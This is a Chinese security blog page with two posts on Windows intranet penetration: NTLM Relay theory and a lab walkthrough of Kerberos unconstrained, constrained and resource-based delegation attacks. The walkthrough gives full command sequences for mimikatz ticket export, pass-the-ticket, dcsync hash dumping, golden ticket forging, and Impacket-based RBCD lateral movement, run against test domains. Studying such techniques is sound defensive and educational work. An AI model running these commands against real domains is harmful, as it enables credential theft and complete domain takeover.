<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    

    <!--Author-->
    
        <meta name="author" content="0xEaS">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="船到桥头自然直"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="船到桥头自然直"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>船到桥头自然直</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">船到桥头自然直</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/">
                内网渗透篇-NTLM Relay攻击
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2022-03-10</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h2 id="NTLM认证"><a href="#NTLM认证" class="headerlink" title="NTLM认证"></a>NTLM认证</h2><p><code>Windows</code>的身份认证方式有两种，一种是<code>NTLM</code>认证方式，即挑战Challenge/响应Response机制；另外一种就是<code>Kerberos</code>认证方式。</p>
<p>早期，<code>Windows</code>域环境下使用<code>NTLM</code>作为认证方式，后来采用了<code>Kerberos</code>协议。在默认环境下，<code>NTLM</code>认证和<code>Kerberos</code>认证同时存在于域环境下。当我们指定主机名的时候，会选用<code>Kerberos</code>来作为认证方式。</p>
<p><img src="E:\boke\blog\source\images\298.png"></p>
<p>而当指定主机<code>ip</code>的时候，会采用<code>NTLM</code>认证方式。</p>
<p><img src="E:\boke\blog\source\images\299.png"></p>
<p><code>NTLM</code>身份认证可以分为两种，一种是本地认证，一种是网络认证。</p>
<p><strong>本地认证</strong></p>
<p><code>Windows</code>将用户的密码存储在本地计算机的<code>SAM</code>文件中，文件位置：<code>C:\Windows\System32\config\SAM</code>。密码的存储以<code>NTLM Hash</code>的方式进行存储。当用户输入密码进行本地认证时，首先系统会将明文密码处理成<code>NTLM Hash</code>，然后与<code>SAM</code>文件中的<code>Hash</code>进行比较，相同则认证通过。同时，会在<code>lsass.exe</code>进程中，保存一份明文密码。</p>
<p>当获取到一台主机权限之后，可以利用<code>mimikatz</code>从<code>lsass</code>进程中导出密码，但是<code>Server 2012R2</code>以后版本及<code>Win10</code>默认是不存储明文密码。</p>
<p><strong>网络认证</strong></p>
<p><code>NTLM</code>的网络认证，仔细细分可以分为工作组环境下的认证和域环境下的认证。大致原理相同，都是采用<code>Challenge/Response</code>验证机制。唯一不同点是，服务端会向域控请求校验。</p>
<p>1.（交互式登录到某客户机）用户使用：域名、用户名、密码，登陆到某台客户端。客户端计算并存储用户密码的加密散列值（Hash），然后将真实的密码丢掉（即不保存用户真实的密码）</p>
<p>2.客户端将用户名以纯文本的方式发送到要访问的服务器</p>
<p>3.服务器产生一个 16 字节的随机数并将该随机数发送给客户端，该随机数通常称为：挑战（Challenge）,并在本地缓存该Challenge</p>
<p>4.客户端使用用户密码的散列值加密服务器发送过来的 Challenge，并将结果发回给服务器， 该步骤通常称为：应答 （Response）</p>
<p>5.服务器将下面三项内容发送到域控制器 （Domain Controller）<br>用户名、缓存的Challenge、从客户端收到的经过加密的Challenge</p>
<p>6.域控制器使用 用户名 从安全账号管理数据库 （Security Account Manager database）中获得用户密码的散列值， 并使用获得的密码散列值来加密 Challenge</p>
<p> 7.域控制器比较步骤（6）中计算得到的加密后的 Challenge值与步骤（4）中客户端加密得到的 Response，如果两者一致，则认证通过</p>
<h2 id="中继攻击原理解析"><a href="#中继攻击原理解析" class="headerlink" title="中继攻击原理解析"></a>中继攻击原理解析</h2><p>NTLM Relay其实严格意义上并不能叫NTLM Relay，而是应该叫 Net-NTLM Relay。它是发生在NTLM认证的第三步，在 Type3 Response消息中存在Net-NTLM Hash，当攻击者获得了Net-NTLM Hash后，可以进行中间人攻击，重放Net-NTLM Hash，这种攻击手法也就是大家所说的**NTLM Relay(NTLM 中继)**攻击。</p>
<p>进行NTLM Relay攻击有两步：</p>
<ul>
<li>第一步是捕获Net-NTLM Hash</li>
<li>第二步是重放Net-NTLM Hash</li>
</ul>
<p><img src="E:\boke\blog\source\images\297.png"></p>
<p>攻击的关键是如何中间截获数据包，获取到<code>Net-NTLM Hash</code>值。下面介绍一些常见的捕获<code>Net-NTLM Hash</code>方法。</p>
<h2 id="捕获Net-NTLM-Hash"><a href="#捕获Net-NTLM-Hash" class="headerlink" title="捕获Net-NTLM Hash"></a>捕获Net-NTLM Hash</h2><p>捕获Net-NTLM Hash又有两步：</p>
<ul>
<li>第一步是需要使目标服务器向攻击者发起NTLM请求</li>
<li>第二步是使用工具来捕获服务器发来的NTLM请求</li>
</ul>
<p>那么如何能使目标服务器向攻击者发起NTLM请求呢？思路是让受害者自己把Net-NTLM Hash发送给攻击者，也就是说只要是使用SMB、HTTP、LDAP、MSSQL等协议来进行NTLM认证的程序，都可以尝试用来向攻击者发送Net-NTLM Hash。比如浏览器、office word文档、pdf文档、explorer等。如果新发现一个这类应用程序，或者发现这些程序的一种调用方法，就会多出一种攻击手段</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/308340.html">浅析域内NTLM Relay攻击</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/O1ZZTijzO_6AV1QuernbXA">你所不知道的NTLM Relay</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2022/03/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9D%9E%E7%BA%A6%E6%9D%9F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">
                内网渗透篇-非约束/约束委派攻击
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2022-03-06</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>域委派是指：将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动</p>
<p>域委派分为三种：</p>
<ul>
<li>约束委派</li>
<li>非约束委派</li>
<li>基于资源委派</li>
</ul>
<h2 id="什么是委派"><a href="#什么是委派" class="headerlink" title="什么是委派"></a>什么是委派</h2><p><strong>委派概念</strong></p>
<p>在kerberos认证机制中，需要访问服务首先需要申请票据认证通过才可以访问。而委派就是用户A访问B服务，但是B需要去C服务调用数据但是B没有权限而A有权限，此时B就带着A访问B时所携带的凭证去访问C成功拿到数据。这个过程就称为委派。</p>
<p><strong>非约束委派（Unconstrained Delegation）</strong></p>
<p>A用户访问B服务，如果B服务是非约束委派机器账户就会把A的票据凭证缓存在本地内存中方便下次操作，但是此时B服务就相当于拥有了A用户的所有权限可以访问A用户可以访问的任何服务。</p>
<p>当被设置为非约束性委派时，其<code>userAccountControl</code>属性包含<code>TRUSTED_FOR_DELEGATION</code></p>
<p><strong>约束委派（Unconstrained Delegation）</strong></p>
<p>因为非约束委派的不安全性，所以出现了约束委派。限制了只能委派特定的服务。而不是拥有其用户的所有访问权限。</p>
<p>即Kerberos的扩展协议S4U2Proxy，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务。</p>
<p>当被设置为约束性委派时，其<code>userAccountControl</code>属性包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code></p>
<p><strong>小结一下</strong></p>
<p>委派任何服务即为非约束委派</p>
<p>委派特定任务即为约束委派</p>
<p><strong>基于资源的约束委派（Resource-based constrained delegation）</strong></p>
<p>基于资源的约束委派(RBCD)是在Windows Server 2012中新加入的功能，与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。也就是说机器自身可以直接在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性来设置RBCD。</p>
<h2 id="非约束委派利用实验"><a href="#非约束委派利用实验" class="headerlink" title="非约束委派利用实验"></a>非约束委派利用实验</h2><p>当某台主机访问了配置了非约束性委派当主机的服务时候，就会将自己当可转发当TGT发送到配置了非约束性委派当主机上。诱导域管账号访问我们的被配置了非约束委派的主机，这样子我们就拥有了域管的TGT，可以生成黄金票据，然后接管域。</p>
<p><strong>工具AdFind.exe</strong></p>
<pre><code>samAccountType=805306369 是查找机器账户
samAccountType=805306368 是查找服务账户</code></pre>
<p>查找域内<strong>非约束委派机器账户</strong>（目标登录的账号是域内账号）</p>
<pre><code>adFind.exe -b &quot;DC=edu, DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</code></pre>
<p><img src="/images/264.png"></p>
<p>查找域内<strong>非约束委派机器账户</strong>（目标登录的账号是本地账号）</p>
<p>由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。</p>
<ul>
<li>需要获得一个域内账号密码</li>
</ul>
<pre><code>adFind.exe -u eas2 -up chen@2020 -b &quot;DC=edu, DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</code></pre>
<p><img src="/images/265.png"></p>
<p>如果域管或者其他用户访问过非委派约束机器账户上的服务，票据就会被载入本地内存。</p>
<p>用mimikatz导出所有票据</p>
<pre><code>privilege::debug
sekurlsa::tickets /export</code></pre>
<p><img src="/images/266.png"></p>
<p>可以看到名称为<code>[0;9bec9]-2-0-60a00000-Administrator@krbtgt-YUNYING.LAB.kirbi</code>的这一条即为Administrator发送的TGT。</p>
<p>通过mimikatz将该票据载入当前会话中，获得域管Administrator权限</p>
<pre><code>kerberos::ptt [0;9bec9]-2-0-60a00000-Administrator@krbtgt-YUNYING.LAB.kirbi</code></pre>
<p><img src="/images/267.png"></p>
<h2 id="非约束委派-Spooler打印机服务"><a href="#非约束委派-Spooler打印机服务" class="headerlink" title="非约束委派+Spooler打印机服务"></a>非约束委派+Spooler打印机服务</h2><p>如果只是单纯的非约束委派话需要管理员主动连接，所以在实战环境利用比较鸡肋。</p>
<p>利用非约束委派+Spooler打印机服务可以强制指定的主机进行连接</p>
<p>利用原理：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。</p>
<ul>
<li><code>Print Spooler</code>服务默认是自动运行的</li>
</ul>
<p><img src="/images/274.png"></p>
<p><strong>自己本地复现失败了，所以贴了先知社区文章中的复现</strong></p>
<p>操作环境：</p>
<ul>
<li>域：<code>test.local</code></li>
<li>域控：系统：<code>Windows server 2012R2</code>主机名：<code>DM2012</code>，ip：<code>192.168.141.134</code></li>
<li>域内主机：系统：<code>windows 10</code>，主机名：<code>win10</code>，ip：<code>192.168.141.165</code></li>
</ul>
<p>这个实现了前提是：需要获取一台主机账户开启了非约束委派域内机器的权限</p>
<p>我们给win10这个主机账户开启非约束委派</p>
<p><img src="/images/275.png"></p>
<p><strong>注</strong>：是主机账户开启非约束委派，而不是服务用户</p>
<p><code>tifkin_</code>在他的github上开源了POC：<a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p>
<p>向DM2012的<code>Spooler</code>服务发送请求，强制其访问win10进行身份验证</p>
<pre><code>SpoolSample.exe dm2012 win10</code></pre>
<p><img src="/images/276.png"></p>
<p>我们可以用<code>Rubeus</code>来监听<code>Event ID</code>为<code>4624</code>事件，这样可以第一时间截取到域控的TGT</p>
<p>每隔一秒监听一次来自<code>dm2012</code>的登陆（需要本地管理员权限）</p>
<pre><code>Rubeus.exe monitor /interval:1 /filteruser:dm2012$</code></pre>
<p><strong>注</strong>：Rubeus.exe捕获到的TGT是base64编码的，但是我们不需要解码，<code>Rubeus</code>可以直接将base64编码的票据直接注入到内存中</p>
<pre><code>Rubeus.exe ptt /ticket:base64</code></pre>
<p>因为我们Rubeus监听TGT用不了，所以我们可以用<code>mimikatz</code>导出TGT</p>
<pre><code>privilege::debug

sekurlsa::tickets /export</code></pre>
<p>可以发现成功导出来自<code>DM2012$</code>的TGT</p>
<p><img src="/images/277.png"></p>
<p><img src="/images/278.png"></p>
<p>得到TGT之后，我们用ptt将票据注入到当前会话后，可以用<code>dcsync</code>导出域控中所有用户的hash，然后用<code>krbtgt</code>用户的hash生成黄金票据</p>
<pre><code>kerberos::ptt [0;862bdd]-2-0-60a10000-DM2012$@krbtgt-TEST.LOCAL.kirbi

lsadump::dcsync /domain:test.local /all /csv</code></pre>
<p><img src="/images/279.png"></p>
<p>得到<code>krbtgt</code>用户的hash之后生成一张administrator的黄金票据</p>
<pre><code>kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-662417213-3583657854-423750704 /krbtgt:683545df56ea57b168d0ad090e209616 /ptt</code></pre>
<p>成功以administrator的身份访问域控</p>
<h2 id="约束委派利用实验"><a href="#约束委派利用实验" class="headerlink" title="约束委派利用实验"></a>约束委派利用实验</h2><p>查找<strong>约束委派服务账户</strong></p>
<pre><code>AdFind.exe -b &quot;dc=edu, dc=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code></pre>
<p><img src="/images/268.png"></p>
<p>使用kekeo工具构造yuesu服务账号的票据</p>
<ul>
<li>获得yuesu服务账户的明文密码或者NTLM</li>
</ul>
<pre><code>kekeo # tgt::ask /user:yuesu /domain:edu.org /password:chen@2022 /ticket:test.kirbi

kekeo # tgt::ask /user:yuesu /domain:edu.org /NTLM:b1f40ef2b02080513f799584e11a8411 /ticket:test.kirbi</code></pre>
<p><img src="/images/269.png"></p>
<p>通过这张TGT伪造s4u请求以administrator用户身份去访问WIN-105NMK8GB23.edu.org的CIFS的ST</p>
<pre><code>kekeo # tgs::s4u /tgt:TGT_yuesu@EDU.ORG_krbtgt~edu.org@EDU.ORG.kirbi /user:administrator@edu.org /service:cifs/WIN-105NMK8GB23.edu.org</code></pre>
<p><img src="/images/270.png"></p>
<p>使用mimikatz将该票据注入到当前内存中</p>
<p><img src="/images/271.png"></p>
<p>接管域</p>
<p><img src="/images/272.png"></p>
<p><img src="/images/273.png"></p>
<h2 id="基于资源的约束委派利用"><a href="#基于资源的约束委派利用" class="headerlink" title="基于资源的约束委派利用"></a>基于资源的约束委派利用</h2><p><strong>环境</strong></p>
<pre><code>域： edu.org
域控：Windows server 2016， 主机名： AD， IP： 192.168.88.131
委派的域内主机：系统：win10，主机名：EAS3，ip：192.168.88.135
域内普通用户： ziyuan，对EAS3有写的权限
域内普通用户： eas11
攻击机器：系统：win10 主机名：EAS111 ip：192.168.88.140 登录用户为eas11</code></pre>
<p>设置ziyuan的写权限</p>
<p><img src="/images/280.png"></p>
<p>验证<strong>ziyuan</strong>这个用户对EAS3是否具有写权限，可以使用PowerView枚举EAS3.edu.org的中的特定ACE</p>
<p>PowerView工具地址<a target="_blank" rel="noopener" href="https://github.com/shigophilo/tools/">https://github.com/shigophilo/tools/</a></p>
<p>打开powershell更改执行策略</p>
<pre><code>Set-ExecutionPolicy Bypass -Scope Process</code></pre>
<p>导入PowerView.ps1</p>
<pre><code>Import-Module .\PowerView.ps1</code></pre>
<p>查看权限</p>
<pre><code>Get-DomainUser -Identity ziyuan -Properties objectsid         # 查询test的SID
Get-DomainObjectAcl -Identity EAS3  | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-3298638106-3321833000-1571791979-1106&quot;&#125;     # 查看是否有写权限</code></pre>
<p><img src="/images/281.png"></p>
<p>可以看到ziyuan这个用户对EAS3这个计算机账户拥有完全控制权限（GenericAll），其实也不一定需要<code>GenericAll</code>权限，<code>GenericWrite</code>、<code>WriteProperty</code>、<code>WriteDacl</code>等等权限都是可以修改账户属性的。</p>
<p><strong>创建机器用户</strong><br>我们现在还需要的是一个具有SPN的账户，因为S4U2Self只适用于具有SPN的账户，恰好的是在域中有一个属性MachineAccountQuota，这个值表示的是允许用户在域中创建的计算机帐户数，默认为10，这意味着我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户，而计算机账户默认是注册RestrictedKrbHost/domain和HOST/domain这两个SPN的，所以这里刚好符合我们的意图。</p>
<p>我们可以使用Kevin Robertson的Powermad中的New-MachineAccount来创建一个用户名为evilsystem，密码为evil的计算机账户<br><strong>导入Powermad.ps1，创建机器账户</strong></p>
<pre><code>Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount evilsystem -Password $(ConvertTo-SecureString &quot;evil&quot; -AsPlainText -Force)</code></pre>
<p><img src="/images/282.png"></p>
<p><strong>配置evilsystem到EAS3的基于资源约束的委派</strong><br>下面是修改EAS3的msDS-AllowedToActOnBehalfOfOtherIdentity属性的值，有两种方法可以修改，Powerview或者ActiveDirectory模块</p>
<p>查看evilsystem机器账户的SID</p>
<pre><code>Get-NetComputer &quot;evilsystem&quot; </code></pre>
<p>powershell执行以下命令</p>
<pre><code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3658974542-4157274802-4269447764-2604)&quot;  #这儿的sid是我们创建的机器用户evilsystem的sid

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer EAS3 | Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes&#125; -Verbose</code></pre>
<p>验证是否成功</p>
<pre><code>Get-DomainComputer EAS3 -Properties msds-allowedtoactonbehalfofotheridentity</code></pre>
<p><img src="/images/283.png"></p>
<p>若想清除msds-allowedtoactonbehalfofotheridentity属性的值，可用如下命令：</p>
<pre><code>Set-DomainObject EAS3 -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose</code></pre>
<p>配置完msDS-AllowedToActOnBehalfOfOtherIdentity属性之后就可以通过基于资源的约束委派去攻击目标主机了攻击过程</p>
<p><strong>攻击</strong></p>
<p>这儿我们使用<code>Rubeus来</code>进行请求白银票据</p>
<p>因为Rubeus是不支持明文的，所以先把它转换为hash</p>
<pre><code>rubeus.exe hash /user:evilsystem /password:evil /domain:edu.org</code></pre>
<p><img src="/images/284.png"></p>
<p>然后用evilsystem$的hash请求白银票据并导入到当前会话中</p>
<pre><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/EAS3 /ptt

Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:host/EAS3 /ptt</code></pre>
<p><img src="/images/285.png"></p>
<p><img src="/images/286.png"></p>
<p>这儿需要导入两个票据才能用psexec连接<code>EAS3</code>(需要管理员权限运行cmd)</p>
<pre><code>psexec64 \\EAS3 cmd</code></pre>
<p><img src="/images/287.png"></p>
<h2 id="实战常用"><a href="#实战常用" class="headerlink" title="实战常用"></a>实战常用</h2><p>当我们知道资源的约束委派攻击的简要后就可以知道：资源的约束委派不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限，说白了其实就是：<strong>计算机加入域时，加入域的域用户和被加入域的域机器自身拥有权限。</strong></p>
<p>换句话说如果我们拥有配置某台主机 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的权限与创建机器账户的权限，那我们就相当于拿到了此机器的所有权限。至于为什么是机器账户，而不能是普通用户的账户，因为攻击的时候会利用到 <code>S4U2Self</code> 协议，而它只适用于具有 <code>SPN</code> 的账户，普通账户是没有 <code>SPN</code> 的，而机器账户是有的。</p>
<p>那么谁有修改某台主机 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 的权限呢？</p>
<p><img src="/images/288.png"></p>
<p><img src="/images/289.png"></p>
<p>看上面这两张图，**<code>win7</code> （机器名）这台机器在加域的时候填写的域内账户是 <code>saulgoodman</code>，那么 <code>saulgoodman</code> 这个域用户就有修改 <code>win7</code> （机器名）这台主机的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的权限**。</p>
<p><strong>在大型内网域环境中，将机器加入到域环境中一般不会用域管权限，而是用一个专门加域的域用户（例如上图的 saulgoodman 就是一个加域用户）去操作。那么当我们拿下该域用户的账号密码时，就可以把通过该域用户加入到域里的所有机器都拿下。</strong></p>
<p>所以如何想利用基于资源的约束性委派进行攻击的话就需要如下两个点：</p>
<ul>
<li>一个机器账户</li>
</ul>
<p>域内用户都有一个属性叫做 <code>ms-ds-MachineAccountQuota</code>，它代表的是允许用户在域中常见计算机账户的个数，默认是10。那么这就代表我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户也就是机器账户。</p>
<ul>
<li>一个有权利修改 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 的账户</li>
</ul>
<p><strong>攻击者可以查询域内计算机的 <code>mS-DS-CreatorSID</code>，这个值代表的是将计算机加入到域内的用户，它是具有修改 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的权限的，如果我们可以拿到那个用户的凭据，就可以控制那个用户添加到域内的所有的电脑。</strong></p>
<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a><strong>攻击原理</strong></h3><p>首先添加机器账户，修改 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 值为机器账户的 <code>sid</code>，然后以机器账户的身份伪造成 <code>administrator</code> 申请一张访问此机器账户机器的 <code>ticket</code>(类似于白银票据)，因为机器账户没有配置约束性委派，所以这张票据是不可转发的，但是在基于资源的约束性委派中，票据是否可以转发不重要，对之后对 <code>s4u2proxy</code> 不影响，最后利用这张 <code>ticket</code> 去申请访问修改了 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的机器。</p>
<h3 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h3><h4 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h4><p><strong>环境</strong></p>
<pre><code>kali攻击机 192.168.80.131
Server 2016 DC 192.168.88.131 域 EDU.ORG
Win10 域内普通主机 主机名:EAS111 IP:192.168.80.130 | 192.168.88.140 登录用户EDU\EAS11 域内普通用户
Win10 域内普通主机 主机名:EAS3   IP:192.168.88.135 登录用户EDU\EAS2 域内普通用户

EAS3是EAS2用户加入域内的机器，我们拿下的EAS111这台机器,并获得了EAS2账户的密码明文或者hash</code></pre>
<p>利用AdFind.exe查询每个域机器是由哪个域用户添加进域的，通过 <code>mS-DS-CreatorSID</code> 查看域用户的 <code>sid</code></p>
<pre><code>AdFind.exe  -b &quot;DC=edu,DC=org&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</code></pre>
<p><img src="/images/290.png"></p>
<p>那么问题来了，我们怎么知道 <code>S-1-5-21-3658974542-4157274802-4269447764-1602</code> 是那个域用户的 sid 呢?</p>
<p>可以使用 sid2user 来帮助我们完成：（需要把 <code>-</code> 去掉）</p>
<pre><code>sid2user.exe \\192.168.88.131 5 21 3658974542 4157274802 4269447764 1602

Name is EAS2
Domain is EDU
Type of SID is SidTypeUser</code></pre>
<p>但是往往一般是我们获得到一个域内普通用户，然后查询改用户SID进行比对。</p>
<pre><code>Import-Module .\PowerView.ps1
Get-DomainUser -Identity EAS2 -Properties objectsid  </code></pre>
<p><img src="/images/291.png"></p>
<p><strong>利用EAS2添加一台机器账户</strong></p>
<p>因为需要用机器用户去申请票据，本身的 EAS111机器账户我们不知道他的密码所以无法申请票据，所以我们需要添加一个机器用户，用来帮助我们申请票据</p>
<pre><code>proxychains python3 addcomputer.py -dc-ip 192.168.88.131 -computer-name &#39;test03$&#39; -computer-pass test03 edu.org/eas2:chen@2020

proxychains python3 addcomputer.py -dc-ip 192.168.88.131 -computer-name &#39;test03$&#39; -computer-pass test03 edu.org/eas2 -hashes bd716f724510ab40f3b89f686411b8cf:bd716f724510ab40f3b89f686411b8cf</code></pre>
<p><img src="/images/292.png"></p>
<p><strong>设置test03到EAS3的RBCD</strong></p>
<pre><code>proxychains python3 rbcd.py -delegate-from test03$ -delegate-to EAS3$ -dc-ip 192.168.88.131 edu.org/eas2:chen@2020 -action write

proxychains python3 rbcd.py -delegate-from test03$ -delegate-to EAS3$ -dc-ip 192.168.88.131 edu.org/eas2 -action write -hashes bd716f724510ab40f3b89f686411b8cf:bd716f724510ab40f3b89f686411b8cf</code></pre>
<p><img src="/images/293.png"></p>
<p><strong>模拟域管理员administrator账号申请访问EAS3的ST，ptt，然后wmiexec到目标主机</strong></p>
<pre><code>proxychains python3 getST.py -spn cifs/EAS3.edu.org -impersonate administrator -dc-ip 192.168.88.131 edu.org/test03$:test03</code></pre>
<p><img src="/images/294.png"></p>
<p><strong>导入票据</strong></p>
<pre><code>export KRB5CCNAME=administrator.ccache</code></pre>
<p><img src="/images/295.png"></p>
<p><strong>wmiexec到目标主机</strong></p>
<pre><code>proxychains python3 wmiexec.py -dc-ip 192.168.88.131 -no-pass -k administrator@EAS3.edu.org</code></pre>
<p><img src="/images/296.jpg"></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>方法同横向一样</p>
<p><img src="/images/296.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>非约束委派场景</strong></p>
<p>当我们在域内拿到一台配置了非约束委派的主机后，就可以使用mimikatz导出所有票据，若是有其他用户访问过该主机，那么我们就可以通过ptt获取该用户权限。</p>
<p>当然我们也可以诱导域管访问该主机，例如通过给管理员发诱饵文件修改Desktop.ini，或是outlook等等。详情可参考<a target="_blank" rel="noopener" href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/5">daiker师傅的发起NTLM请求</a></p>
<p>还有一个很重要的就是<u>非约束委派+Spooler打印机服务</u>，因为Spooler默认就是开启的。</p>
<p><strong>约束委派场景</strong></p>
<p>约束委派可以作为变种黄金票据，用作后门权限维持</p>
<p>打下配置了约束委派的服务账号，我们就可以拿下被配置的约束委派的服务(A-&gt;B)</p>
<p><strong>基于资源的约束委派场景</strong></p>
<p>A配置了到B的RBCD，打下A就可以打下B。和约束委派横向利用场景一致</p>
<p>拿下一个域内普通用户权限，就可以拿下该用户加入域内的所有机器</p>
<p>权限提升</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/198381.html">Kerberos协议探索系列之委派篇</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7217#toc-8">域渗透——Kerberos委派攻击</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/107096250/">域渗透——基于资源的约束委派利用</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10061#toc-11">Kerberos委派攻击的那些事</a></p>
